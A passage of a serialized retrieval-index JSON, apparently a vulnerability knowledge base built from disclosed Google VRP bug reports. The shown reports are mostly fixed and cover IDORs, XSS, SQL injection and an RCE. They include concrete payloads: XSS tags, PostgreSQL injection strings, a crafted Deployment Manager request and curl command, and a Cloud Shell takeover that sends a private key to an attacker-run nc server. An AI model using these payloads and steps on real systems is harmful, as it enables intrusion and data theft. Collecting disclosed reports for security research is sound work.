"2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "03d6c74a-702f-4265-91f0-8945e6619169", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "82d5de4186e693e91dcc0a6bca2d6c3f82bfdec23815021ad461520a9cba752e", "class_name": "RelatedNodeInfo"}, "2": {"node_id": "7cc18795-0679-4c9a-9c56-dbc23d607be3", "node_type": "1", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d69063351311899cca5ca57a84a57ea925b82ac38e1bc2e10d8fa52efc92994d", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Uploads Endpoints\r\nThis endpoint is identical to\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nabove however it doesn't return useful information nor it can be chained with others.\r\n/aw_bulk/_/rpc/BulkExecutionStatusService/GetStatus\r\nI'm leaving it here if the security team wants to investigate further or patch it along.\r\nSteps to reproduce\r\nCreate a profile in\r\nGoogle Ads\r\nand navigate to\r\nBulk Actions\r\nObserve exists 3 columns which are\r\nRules\r\n,\r\nScripts\r\nand\r\nUploads\r\nClick\r\nScripts\r\nand create a new script with the following code and name it\r\nfunction main() {\r\nLogger.log(\"Hello Google VRP!\")\r\n}\r\nPrepare to intercept a POST request to\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nClick\r\nPreview\r\nin the bottom right corner\r\nObtain the value of\r\ndashboard id\r\nand\r\nscript id\r\nLogin into another account and perform the same thing.\r\nRetrieve the\r\nexecution_id\r\nand use it in\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nto get the script output information\r\nOptional: Use an account to intercept a POST request to\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nand substitude both values to\r\n385089529\r\nand\r\n3931988\r\n. Both of them are valid values of\r\ndashboard id\r\nand\r\nscript id\r\nfrom my test account.\r\nUnlisted YouTube POC video\r\nhttps://youtu.be/6KNwYPgs8DQ\r\nAttack scenario\r\nA regular user finds a way to obtain a valid\r\ndashboard id\r\n(maybe through account sharing) and bruteforce a valid\r\nscript id\r\nto retrieve a valid\r\nexecution_id\r\nwhich will reveal their previous script output details.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 3033, "end_char_idx": 4588, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "26a4cf8b-a0b4-483a-8ec1-22cceff71638": {"__data__": {"id_": "26a4cf8b-a0b4-483a-8ec1-22cceff71638", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.txt", "file_name": "20250408_175724_258324.txt", "file_type": "text/plain", "file_size": 2152, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2b662e88-abfa-47a4-9143-6343ab6caba7", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_258324.txt", "file_name": "20250408_175724_258324.txt", "file_type": "text/plain", "file_size": 2152, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "8fe31b7b227c103034074834c563b997811c0a005ea7a12881163c2bf32dfbaf", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Cloud DM\r\nReported by:\r\nEzequiel Pereira\r\nGoogle VRP\r\ntriaged\r\n17:21 | May 8, 2020\r\naccepted\r\n17:25 | May 8, 2020\r\nfixed\r\n05:26 | Oct 17, 2020\r\naccepted\r\n23:17 | Jan 28, 2021\r\nfixed\r\n15:29 | Feb 28, 2021\r\nreward decided\r\n$31,837\r\nSummary: RCE in Google Cloud Deployment Manager\r\nCreate a Type Provider like this:\r\nPOST /deploymentmanager/staging_dogfood/projects/the-expanse/global/typeProviders HTTP/1.1\r\nHost: www.googleapis.com\r\nAuthorization: Bearer <TOKEN>\r\nContent-Type: application/json\r\nContent-Length: 761\r\n\r\n{\r\n  \"name\": \"hack\",\r\n  \"descriptorUrl\": \"https://test-appengine.sandbox.googleapis.com/$discovery/rest?key=AIzaSyDrGwinQGYOyRu_QcMyYMEtsx3OMwoLuck\",\r\n  \"options\": {\r\n    \"inputMappings\": [\r\n      {\r\n        \"fieldName\": \"Authorization\",\r\n        \"methodMatch\": \".*\",\r\n        \"value\": \"$.concat(\\\"Bearer \\\", $.googleOauth2AccessToken())\",\r\n        \"pythonValue\": \"\",\r\n        \"location\": \"HEADER\"\r\n      }\r\n    ]\r\n  },\r\n  \"googleOptions\": {\r\n    \"gslbTarget\": \"blade:apphosting-admin-nightly\",\r\n    \"descriptorUrlServerSpec\": \"blade:apphosting-admin-nightly\",\r\n    \"injectProject\": true,\r\n    \"ownershipKind\": \"GOOGLE\",\r\n    \"credentialType\": \"GAIAMINT\",\r\n    \"transport\": \"GSLB\",\r\n    \"deleteIntent\": \"CREATE_OR_ACQUIRE\",\r\n    \"isLocalProvider\": false\r\n  }\r\n}\r\nAUTH='Authorization: Bearer ';\r\nDESCRIPTOR='http://example.com/any/path?and=param';\r\n\r\ncurl -XPOST   'https://www.googleapis.com/deploymentmanager/staging_dogfood/projects/sdcpocs/global/typeProviders?key=AIzaSyAa8yy0GdcGPHdtD083HiGGx_S0vMPScDM'   --header \"$AUTH\"   --header 'Accept: application/json'   --header 'Content-Type: application/json'   --data '{\"name\":\"hack3\",\"descriptorUrl\":\"'$DESCRIPTOR'\",\"googleOptions\":{\"gslbTarget\":\"ANYGSLBTARGET\",\"descriptorUrlServerSpec\":\"ANYGSLBTARGET\",\"injectProject\":true,\"ownershipKind\":\"GOOGLE\",\"credentialType\":\"GAIAMINT\",\"transport\":\"GSLB\",\"deleteIntent\":\"CREATE_OR_ACQUIRE\",\"isLocalProvider\":false}}'\r\nThen you can read the response on the operation selfLink (but if you do a full target, you can also read any other response).\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2136, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4f1bc339-60e3-43b2-b670-896f4300d120": {"__data__": {"id_": "4f1bc339-60e3-43b2-b670-896f4300d120", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.txt", "file_name": "20250408_175724_289844.txt", "file_type": "text/plain", "file_size": 884, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "19c6cc07-bc14-4fb6-9803-1d2a633e738a", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_289844.txt", "file_name": "20250408_175724_289844.txt", "file_type": "text/plain", "file_size": 884, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d11a7093996c3390034582431d7c53f4666309e5e4219a5f3cd5fe18b71d7a4f", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Google Appsheet\r\nReported by:\r\nAnurag Kumar Rawat\r\nGoogle VRP\r\ntriaged\r\n19:39 | May 4, 2020\r\naccepted\r\n06:04 | May 5, 2020\r\nfixed\r\n08:13 | Aug 15, 2020\r\nSummary: IDOR leads to information Disclosure\r\nSteps to reproduce:\r\nOpen any portfolio page on\r\nwww.appsheet.com\r\n,\r\nexample:\r\nhttps://www.appsheet.com/portfolio/109795\r\nCheck page source code.\r\nHere you see that user email is disclosed through hidden input type name=partner\r\nexample\r\nNow attacker can increment or decrement portfolio id to fetch users email id\r\nCode Snippet example:\r\n<input name=\"partner\" type=\"hidden\" value=\"[REDACTED_EMAIL]\" />\r\nAttack scenario:\r\nAttacker is able to enumerate portfolio id to fetch company information And email id\r\nAcquisition info:\r\nhttps://blog.appsheet.com/appsheet-acquired-by-google-cloud\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 868, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "02510199-2642-4cef-b0c5-1f938775df5e": {"__data__": {"id_": "02510199-2642-4cef-b0c5-1f938775df5e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.txt", "file_name": "20250408_175726_398236.txt", "file_type": "text/plain", "file_size": 1909, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ddd8b97a-930f-459e-9a76-8e25e285a50f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_398236.txt", "file_name": "20250408_175726_398236.txt", "file_type": "text/plain", "file_size": 1909, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0c3d13d0466ab00808e22c725030a9cc1b806ab808aca2d4a81a1861bf952ab9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://docs.google.com/spreadsheets/create\r\nReported by:\r\nLo\u00efck Jeanneret\r\nGoogle VRP\r\ntriaged\r\n20:01 | Mar 2, 2020\r\naccepted\r\n22:42 | Mar 2, 2020\r\nfixed\r\n06:34 | Jun 5, 2020\r\nreward decided\r\n$3,133.70\r\nSteps to reproduce:\r\nSelect all cells\r\nRight click -> Data validation\r\nCriteria: list of item\r\nCriteria (text area): <img src=\"err\" onerror=\"alert(document.domain);\" /> (domain.domain is docs.google.com)\r\nOn invalid data: Reject input\r\nUntick \"Show drop-down list in cell\"\r\nSave\r\nEdit any cell with any text that is not what was specified in (4.) and press enter\r\nBrowser/OS: Internet Explorer 11 (Version 11.657.18362.0) / Windows 10\r\nBrowser/OS: Microsoft Edge 44.18362.449.0 / Windows 10\r\nAlternative: Clickjacking\r\nWhile less powerful, this works on all browser.\r\nSteps to reproduce:\r\nFollow the same steps as above\r\nReplace the <img> tag on step (4.) by a <style> tag that hides the usual \"OK\" button and create a fake one which contains a link to any website. It is also possible to fake the google login form, and post the data to any website.\r\nBrowser/OS: Google Chrome Version 79.0.3945.130 (Official Build) (64-bit)\r\nAttack scenario:\r\nExample:\r\nAn attacker create a spreadsheet and make it editable by everyone, then it follows the specified steps (but replaces the script by malicious code). The attacker can set any text that would incite users to type anything in the cells (e.g.: poll, taxes calculation, ...).\r\nWhen any user enters text in the spreadsheet, it will execute the script when using Microsoft Edge or Internet Explorer 11.\r\nIf the user uses a modern browser, the attacker can show a fake google login form (the URL will still be\r\nhttps://docs.google.com/spreadsheets\r\n), which can probably be auto-filled. When the user sends the form, credentials are sent to a third party website.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1892, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "12a72c23-2125-4568-86b7-abf3dfa6ff47": {"__data__": {"id_": "12a72c23-2125-4568-86b7-abf3dfa6ff47", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.txt", "file_name": "20250408_175726_429657.txt", "file_type": "text/plain", "file_size": 873, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d04f04b0-e1e3-4498-97e5-37ac1e283988", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.txt", "file_name": "20250408_175726_429657.txt", "file_type": "text/plain", "file_size": 873, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d04396ffdef7917753aef8950302142dce894c7792eb62d2eacd0bccf9c764a9", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://support.google.com/cloud/contact/prod_issue\r\nReported by:\r\nRio Mulyadi Pulungan\r\nGoogle VRP\r\ntriaged\r\n02:36 | Feb 27, 2020\r\naccepted\r\n21:41 | Feb 28, 2020\r\nfixed\r\n01:08 | Dec 18, 2022\r\nreward decided\r\n$8,133.70\r\nGoogle comment\r\nThis issue was rewarded twice, as the first fix was incomplete, and the reporter followed up with us to report the ongoing issue.\r\nSteps to reproduce:\r\nOpen this link\r\nhttps://support.google.com/cloud/contact/prod_issue\r\nFill Subject, Full Description, and Affected product with XSS hunter Payload\r\nXSS will trigger in\r\nhttps://sfstory.googleplex.com/22274538\r\n&\r\nhttps://unify.my.salesforce.com/5005w00001Wm5Mg\r\nBrowser/OS: Google Chrome\r\nAttack scenario:\r\nAttacker can send xss payload and gain admin cookie, attacker use xss hunter payload\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 857, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "a1406aea-4a81-433e-b099-f909d9ad5c26": {"__data__": {"id_": "a1406aea-4a81-433e-b099-f909d9ad5c26", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.txt", "file_name": "20250408_175726_461077.txt", "file_type": "text/plain", "file_size": 2550, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "71bb8e6b-075e-497e-a7ea-fc859f5b9db6", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_461077.txt", "file_name": "20250408_175726_461077.txt", "file_type": "text/plain", "file_size": 2550, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "df09ac54b3603d619be4708d52ab302b8c1ce73be0129cc7d208d9241de26f92", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://ssh.cloud.google.com/\r\nReported by:\r\nOmar Espino\r\nGoogle VRP\r\ntriaged\r\n09:05 | Feb 7, 2020\r\naccepted\r\n00:42 | Feb 15, 2020\r\nfixed\r\n05:32 | Mar 19, 2020\r\nreward decided\r\n$5,000\r\nSummary: google cloud shell instance take over (as root)\r\nSteps to reproduce:\r\n1.- setup a ssl server that you own in any port, I will use ngrok + nc combo over port 55555\r\n2.- visit\r\nhttps://github.com/omespino/gcs_instace_takeover\r\nand clic open in google cloud shell\r\n3.- wait to load everything and then click the preview button for the .md files (you need to set up the attacker server that you own before de preview)\r\n4.- receive 2 google vm's files: '/etc/hosts' and the private key '../id_cloudshell' (scape the container with '../' )\r\n    4.1: for the private key you need to replace \\n for jumplines and save it as 'id_cloudshell'\r\n    4.2: the hostname is \"cs-6000-devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX\", we delete the cs-6000 part and append .cloudshell.dev, getting something like this devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev\r\n5.- login as root on ssh over port 6000\r\n    'ssh -i id_cloudshell -p 6000\r\nroot@devshell-vm-XXXXXXXX-XXXX-XXXXX-XXXXX.cloudshell.dev\r\n'\r\n6.- w00t!!! now you are r00t! on that google cloudshell instance\r\nunlisted youtube POC video (with music loool)\r\nhttps://youtu.be/KFzShR2PvvI\r\nAttack scenario:\r\nExplanation:\r\nThere is a \"sandboxed\" XSS on previewing any md, you use this payload <style onload=alert(document.domain))> and preview the file to see the pop up,\r\nalso once you check the domain of that sandbox and access to it via http you can see that is just the theia editor embed, with access to all files of that google cloudshell instance ;), anyway after some digging I found this endpoint that let you read any id file of the instances\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///any_file\r\nand another one that let you download files\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/download/?id=xxxxxxx-xxxxx-xxxxxx-xxx-xxxxx\r\n, so when you combine that file id and concatenate that with the second end point you are able to read any file, just need to send that result to your server, that in this case was the /etc/hosts file to construct the url to connect over ssh and the private key of that instance (\r\nhttps://XXX-dot-XXXXXXXX-dot-devshell.appspot.com/files/?uri=file:///\r\nenpoint let you 'escape' the container and read files outsite the root \"/\" of the container)\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2534, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8d805081-2b96-4e5e-b6cc-a47892605e09": {"__data__": {"id_": "8d805081-2b96-4e5e-b6cc-a47892605e09", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.txt", "file_name": "20250408_175726_492824.txt", "file_type": "text/plain", "file_size": 2228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5e2c8a10-e17a-4a8e-975d-bb1df73729c8", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_492824.txt", "file_name": "20250408_175726_492824.txt", "file_type": "text/plain", "file_size": 2228, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "d789dc18640fd774fc32713069681aab4d3596b0597a5079a1c4e439c2ba1ddb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in [POST METHOD] https://marketfinder.thinkwithgoogle.com/user_data/\r\nReported by:\r\nShivam Singh KiNg\r\nGoogle VRP\r\ntriaged\r\n22:18 | Jan 6, 2020\r\naccepted\r\n22:53 | Jan 7, 2020\r\nfixed\r\n03:12 | Jan 18, 2020\r\nThe issue here is that the vulnerable webapplication doesn\u2019t check if the provided value for the profile_id and id parameter is actually an id of a \u201cLogged in user\u2019\r\nVulnerability Name : IDOR\r\nVulnerable Parameter : profile_id: and id:\r\nVulnerable Website: marketfinder.thinkwithgoogle.com\r\n[*]i'm check allready marketfinder.thinkwithgoogle.com is not aviliable any this types of features to add friend and invite friend\r\n[*]step to reproduce this bug:\r\nUser 1 Account name :user 1 account\r\nuser 1 website name:\r\nhttps://user1.com\r\nuser 1 Account Email-Id:\r\nkingback05675@gmail.com\r\nuser 1 Account Login Google Chrome Browser:\r\nuser 2 Account Name:user2 account\r\nuser 2 Account Email-id:\r\nbughunter05675@gmail.com\r\nuser 2 website name:\r\nhttps://user2.com\r\nuser 2 Account Login FireFox Browser:\r\nStep To Reproduce :\r\nLogin Both Account user2 Account Login FireFox And user1 Account Login Google Chrome\r\nuser2 account Need user1 Profile id= Suppose i know user1 Account Profile Id (5755368216985600)\r\nuser2 go to Dicovers Markets click Add Market\r\nintercept the request into burpsuit and find vulnerable parameter\r\nprofile id and id or repleced the user1 Profile Id and click Forwarded\r\nlet's move user1 account and check user2 account add or not, you can see user2 account added successfully Goto Setting and successfully access user2 account without user1 permission.\r\nPOC VIDEO LINK:->\r\nhttps://www.youtube.com/watch?v=XvDaHwtfMco&feature=youtu.be\r\nAttack scenario:\r\nthis scenario is clear to user2 added account to user1 without user1 permission the attacker could using automatically brute forcing tool the vulnerable parameter, and some user profile id is correct then attacker success add own account to any victim account without victim permission.or abusing google funcanility\r\nNOTE:\r\nsecurity team please you check this bug in your level if i missed something,then you catch, i'm say honestly my level is low\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2206, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "939b7e32-f1e2-4a21-b4a8-00efc90cc73d": {"__data__": {"id_": "939b7e32-f1e2-4a21-b4a8-00efc90cc73d", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.txt", "file_name": "20250408_175726_524834.txt", "file_type": "text/plain", "file_size": 1376, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "5f54a15d-120d-400f-9bac-b450145ed972", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_524834.txt", "file_name": "20250408_175726_524834.txt", "file_type": "text/plain", "file_size": 1376, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "b05e3733aadd4d545fe86ea8a3754a7b296349b5fe412ac4488bb6ec3cd24756", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in whereismytrain\r\nReported by:\r\nVatsal Vaishy\r\nGoogle VRP\r\ntriaged\r\n17:42 | Oct 24, 2019\r\naccepted\r\n01:20 | Oct 25, 2019\r\nfixed\r\n01:38 | Jun 6, 2021\r\nreward decided\r\n$1,337\r\nSummary: Sql Injection (parameter train_no) on subdomain (pre-prod.whereismytrain.in)\r\nSteps to reproduce:\r\nVisit the link\r\nhttps://pre-prod.whereismytrain.in/mt/submit_change_in_status\r\nwhich is the fourth on the list which is affected\r\nThe parameter is train_no is injectable with Error-Type Postgresql\r\nDetail of the injection to further test or reproduce is\r\nParameter: train_no (POST)\r\n    Type: error-based\r\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\r\n    Payload: train_no=' AND 5178=CAST((CHR(113)||CHR(113)||CHR(120)||CHR(118)||CHR(113))||(SELECT (CASE WHEN (5178=5178) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(122)||CHR(113)) AS NUMERIC) AND 'PdSo'='PdSo&train_date=\r\nBrowser/OS: Chrome/Firefox\r\nAttack scenario:\r\nThis subdomain can be reached by a good recon and the directories have to be brute-forced. The application and the owner straightaway looses first two pillars of CIA triad. By letting the application go vulnerable as well as attacker getting a chance to be handy with data.\r\nAcquisition info:\r\nIt was acquired in the 2k18 end acc to Crunchbase\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1360, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "356e0730-240d-4860-b05b-58cff56edde6": {"__data__": {"id_": "356e0730-240d-4860-b05b-58cff56edde6", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.txt", "file_name": "20250408_175726_571908.txt", "file_type": "text/plain", "file_size": 1770, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "2d396aa5-d28c-4dbf-98f5-8f56cfeeaf7a", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_571908.txt", "file_name": "20250408_175726_571908.txt", "file_type": "text/plain", "file_size": 1770, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "0846d7559f3e8fb379c3e70b0c043ef91e90499cce1a3dd7db5f0fa1ba3d1dfc", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Whereismytrain\r\nReported by:\r\nVatsal Vaishy\r\nGoogle VRP\r\ntriaged\r\n15:49 | Oct 24, 2019\r\naccepted\r\n01:09 | Oct 25, 2019\r\nfixed\r\n04:53 | Mar 22, 2020\r\nSummary: PostgreSQL- Error based & Time based & Stacked Queries\r\nSteps to reproduce:\r\nGo to url\r\nhttps://whereismytrain.in/mt/change_in_status\r\nSend a normal request on a proxy with train number and date, Intercept and inject your\r\nDate\r\nit would throw an error\r\nLeading to an injection\r\nFor your assistance the injection type ==> injection title ==> injection payload\r\nType: error-based\r\n    Title: PostgreSQL AND error-based - WHERE or HAVING clause\r\n    Payload: train_no=12424&train_date=22-10-2019' AND 7869=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (7869=7869) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(106)||CHR(120)||CHR(107)||CHR(113)) AS NUMERIC) AND 'WfdB'='WfdB\r\nType: stacked queries\r\nTitle: PostgreSQL > 8.1 stacked queries (comment)\r\nPayload: train_no=12424&train_date=22-10-2019';SELECT PG_SLEEP(5)--\r\n\r\nType: time-based blind\r\nTitle: PostgreSQL > 8.1 AND time-based blind\r\nPayload: train_no=12424&train_date=22-10-2019' AND 2413=(SELECT 2413 FROM PG_SLEEP(5)) AND 'KKpT'='KKpT\r\nBrowser/OS: Chromium/Firefox\r\nAttack scenario:\r\nA mere visitor to this application with an intention to damage the repo will enter the upgiven link capture the parameter and escalate it to making it a potential injection.\r\nThey gain the application's data as well as the application's code in some results. Even I am getting hard time to understand how come \"python\" is passing through the threads in the exploitation framework when you command --dump-all (SQLMap)\r\nAcquisition info:\r\nCrunchbase\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1754, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "3d66df1a-3eac-4029-910a-2d5822573976": {"__data__": {"id_": "3d66df1a-3eac-4029-910a-2d5822573976", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.txt", "file_name": "20250408_175728_661788.txt", "file_type": "text/plain", "file_size": 2535, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "959d1046-d11d-437c-9841-c671ee0b9659", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_661788.txt", "file_name": "20250408_175728_661788.txt", "file_type": "text/plain", "file_size": 2535, "creation_date": "2025-04-14", 